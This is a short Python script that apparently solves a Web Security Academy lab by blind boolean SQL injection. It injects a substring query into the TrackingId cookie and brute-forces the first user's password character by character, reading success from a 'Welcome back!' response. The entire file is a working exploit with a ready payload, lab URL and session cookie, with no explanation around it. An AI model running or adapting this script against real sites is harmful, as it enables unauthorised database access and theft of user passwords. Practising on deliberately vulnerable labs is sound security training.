#!/usr/bin/python3

import requests
import signal
import sys
import time 
import string
from pwn import *



def def_handler(sig,frame):
    print ("\n\n....SALIENDO....\n\n")
    sys.exit(1);

#CONTROL+C

signal.signal(signal.SIGINT, def_handler)


main_url = "https://0a8400b2032178a3e4d0098e00890071.web-security-academy.net"
characters = string.printable


p1= log.progress("Forece Brute")
p1.status("Starting Force Brute")


time.sleep(2)

p2 = log.progress("password-administrator;")


def makeSQLI():
    
    user = ""

    for position in range(1,50):
        for character in characters:
             
            cookies = {
                'TrackingId' : "T6acg0ABBcZiPXDp'and (select substring(password,%d,1) from users limit 1) ='%s'-- -" % (position,character),
                'session' : "mU1ipfeQo9V362Vfc93WNP1iBKG42Ik2"       
            }
            
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url,cookies=cookies)

            

            if "Welcome back!" in r.text:
                user += character
                p2.status(user)
                break



            
   
if __name__ == '__main__':

    makeSQLI()
